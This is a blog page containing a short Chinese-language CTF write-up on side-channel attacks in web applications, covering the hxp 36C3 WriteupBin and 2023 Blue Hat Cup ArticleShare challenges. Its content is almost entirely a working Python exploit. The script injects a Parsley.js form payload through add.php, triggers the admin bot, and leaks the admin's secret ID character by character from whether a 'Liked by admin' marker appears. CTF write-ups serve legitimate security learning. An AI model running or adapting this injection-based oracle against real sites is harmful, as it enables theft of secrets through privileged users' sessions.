@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>侧信道攻击在Web安全中的应用 | Lunatic&#39;s Workstation</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="在比赛中遇到了很多次侧信道攻击的题目，于是打算深入学习一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="侧信道攻击在Web安全中的应用">
+<meta property="og:url" content="https://goodlunatic.github.io/2023/09/20/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E5%9C%A8Web%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/index.html">
+<meta property="og:site_name" content="Lunatic&#39;s Workstation">
+<meta property="og:description" content="在比赛中遇到了很多次侧信道攻击的题目，于是打算深入学习一下">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-09-20T08:55:13.000Z">
+<meta property="article:modified_time" content="2023-09-20T11:12:33.601Z">
+<meta property="article:author" content="Lunatic">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Lunatic&#39;s Workstation" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Lunatic&#39;s Workstation</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+          <a class="main-nav-link" href="/Friends">Friends</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://goodlunatic.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-侧信道攻击在Web安全中的应用" class="article article-type-post" itemscope
+  itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/09/20/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E5%9C%A8Web%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" class="article-date">
+  <time datetime="2023-09-20T08:55:13.000Z" itemprop="datePublished">2023-09-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+    <header class="article-header">
+      
+  
+    <h1 class="article-title" itemprop="name">
+      侧信道攻击在Web安全中的应用
+    </h1>
+  
+
+    </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      <div class="toc-parent">
+  <div id="toc" class="toc-article">
+    <div class="toc-title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#hxp-36C3-CTF-WriteupBin-amp-2023%E8%93%9D%E5%B8%BD%E6%9D%AFAirticleShare"><span class="toc-text">hxp 36C3 CTF WriteupBin&amp;2023蓝帽杯AirticleShare</span></a></li></ol>
+  </div>
+</div>
+      <p><strong>在比赛中遇到了很多次侧信道攻击的题目，于是打算深入学习一下</strong></p>
+<span id="more"></span>
+
+<h1 id="hxp-36C3-CTF-WriteupBin-amp-2023蓝帽杯AirticleShare"><a href="#hxp-36C3-CTF-WriteupBin-amp-2023蓝帽杯AirticleShare" class="headerlink" title="hxp 36C3 CTF WriteupBin&amp;2023蓝帽杯AirticleShare"></a>hxp 36C3 CTF WriteupBin&amp;2023蓝帽杯AirticleShare</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    host = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    base_url = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/&quot;</span></span><br><span class="line">    res = s.get(base_url)</span><br><span class="line">    pos = res.text.find(<span class="string">&#x27;name=&quot;c&quot; value=&quot;&#x27;</span>) + <span class="built_in">len</span>(<span class="string">&#x27;name=&quot;c&quot; value=&quot;&#x27;</span>)</span><br><span class="line">    csrftoken = res.text[pos:pos+<span class="number">16</span>]</span><br><span class="line">    <span class="comment"># print(csrftoken)</span></span><br><span class="line">    ss = <span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> ss:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;trying&quot;</span>,j)</span><br><span class="line">            payload = <span class="string">f&#x27;&#x27;&#x27;&lt;form data-parsley-validate&gt;</span></span><br><span class="line"><span class="string">                      &lt;input data-parsley-required</span></span><br><span class="line"><span class="string">                      data-parsley-trigger=\&quot;blur\&quot;</span></span><br><span class="line"><span class="string">                      data-parsley-error-message=\&quot;&lt;input type=button id=like&gt;\&quot;</span></span><br><span class="line"><span class="string">                      data-parsley-errors-container=\&quot;a[href^=\&#x27;/lookup.php?id=<span class="subst">&#123;flag + j&#125;</span>\&#x27;]\&quot;</span></span><br><span class="line"><span class="string">                      autofocus&gt;</span></span><br><span class="line"><span class="string">                      &lt;/form&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">#blur设置了触发方式为输入框失去焦点</span></span><br><span class="line">            <span class="comment">#错误提示为一个假按钮</span></span><br><span class="line">            <span class="comment">#当输入的Writeup ID与数据库中存放的admin的Writeup ID匹配或部分匹配时，</span></span><br><span class="line">            <span class="comment">#data-parsley-errors-container生效，我们伪造的点赞按钮在真的点赞按钮上方显示</span></span><br><span class="line">            <span class="comment">#autofocus设置了当页面加载时input元素自动获得焦点</span></span><br><span class="line">            </span><br><span class="line">            data = &#123;<span class="string">&#x27;c&#x27;</span>: csrftoken, <span class="string">&#x27;content&#x27;</span>: payload&#125;</span><br><span class="line">            res = s.post(base_url + <span class="string">&quot;add.php&quot;</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="comment"># print(res.headers)</span></span><br><span class="line">            location = res.headers[<span class="string">&#x27;Location&#x27;</span>]</span><br><span class="line">            pos = location.find(<span class="string">&#x27;id=&#x27;</span>) + <span class="number">3</span></span><br><span class="line">            wp = location[pos:]</span><br><span class="line">            data = &#123;<span class="string">&#x27;c&#x27;</span>: csrftoken, <span class="string">&#x27;id&#x27;</span>: wp&#125;</span><br><span class="line">            <span class="comment"># print(data)</span></span><br><span class="line">            res = s.post(base_url + <span class="string">&quot;admin.php&quot;</span>, data=data)</span><br><span class="line">            time.sleep(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">            res = s.get(<span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/lookup.php?id=<span class="subst">&#123;wp&#125;</span>&quot;</span>)</span><br><span class="line">            txt = res.text.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Liked by&lt;/h3&gt;admin&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> txt:</span><br><span class="line">                flag += j</span><br><span class="line">                <span class="built_in">print</span>(i,flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://goodlunatic.github.io/2023/09/20/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E5%9C%A8Web%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" data-id="clmsj8r66002ois3z9fla66fi" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+  
+<nav id="article-nav">
+  
+    <a href="/2023/09/21/Network%20Traffic%20Analysis/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Network Traffic Analysis
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/09/20/Penetration%20Testing%20Knowledge/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Penetration Testing Knowledge</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ACM/">ACM</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/BlockChain/">BlockChain</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">18</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Courses/">Courses</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Database/">Database</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hexo/">Hexo</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Language/">Language</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Raspberry-Pi/">Raspberry-Pi</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Skills/">Skills</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUp/">WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/">年终总结</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ACM/" style="font-size: 10px;">ACM</a> <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Courses/" style="font-size: 13.33px;">Courses</a> <a href="/tags/Crypto/" style="font-size: 11.67px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Git/" style="font-size: 10px;">Git</a> <a href="/tags/Hexo/" style="font-size: 11.67px;">Hexo</a> <a href="/tags/Java/" style="font-size: 10px;">Java</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/Leetcode/" style="font-size: 10px;">Leetcode</a> <a href="/tags/Misc/" style="font-size: 15px;">Misc</a> <a href="/tags/Mysql/" style="font-size: 10px;">Mysql</a> <a href="/tags/Nodejs/" style="font-size: 10px;">Nodejs</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/Program/" style="font-size: 10px;">Program</a> <a href="/tags/Pwn/" style="font-size: 11.67px;">Pwn</a> <a href="/tags/Python/" style="font-size: 11.67px;">Python</a> <a href="/tags/Raspberry-Pi/" style="font-size: 10px;">Raspberry-Pi</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/Skills/" style="font-size: 18.33px;">Skills</a> <a href="/tags/Web/" style="font-size: 16.67px;">Web</a> <a href="/tags/WriteUp/" style="font-size: 10px;">WriteUp</a> <a href="/tags/forensics/" style="font-size: 10px;">forensics</a> <a href="/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" style="font-size: 10px;">年终总结</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/09/21/CTF%E2%80%94%E2%80%94Misc%E6%8C%87%E5%8D%97%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/">CTF——Misc指南【长期更新】</a>
+          </li>
+        
+          <li>
+            <a href="/2023/09/21/Network%20Traffic%20Analysis/">Network Traffic Analysis</a>
+          </li>
+        
+          <li>
+            <a href="/2023/09/20/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E5%9C%A8Web%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">侧信道攻击在Web安全中的应用</a>
+          </li>
+        
+          <li>
+            <a href="/2023/09/20/Penetration%20Testing%20Knowledge/">Penetration Testing Knowledge</a>
+          </li>
+        
+          <li>
+            <a href="/2023/09/20/PHP%20Basic%20and%20Vulnerability/">PHP Basic and Vulnerability</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    <div class="widget-wrap toc">
+  <h3 class="widget-title">Catalog</h3>
+  <div class="widget"></div>
+</div>
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 Lunatic<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+    <a href="/Friends" class="mobile-nav-link">Friends</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+<!-- Toc -->
+
+<script src="/js/toc.js"></script>
+
+<!-- Toc -->
+  </div>
+</body>
+</html>
